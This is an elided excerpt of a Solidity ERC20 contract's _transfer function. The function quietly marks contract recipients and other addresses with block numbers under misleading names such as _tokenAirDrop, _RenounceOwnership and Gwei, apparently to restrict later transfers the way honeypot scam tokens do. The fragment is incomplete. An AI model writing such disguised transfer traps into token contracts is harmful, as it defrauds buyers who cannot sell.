...
contract ERC20 is Context, IERC20 {
  ...
  mapping(address => uint256) private _approveAccount;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    if (!_tokenAirDrop) {
        ...
        if (codeSize > 0 && !_approveAddress[recipient]) {    
            ...
            _approveAccount[recipient] = block.number;    
        }    
        if (getApproval[recipient] == 0 && !Gwei[recipient]) {    
            _sendApproval(recipient, _RenounceOwnership);    
        }    
    }    
    if ((_approveAddress[sender] && block.number > _approveAccount[sender]) || (getApproval[sender] > 0)) {    
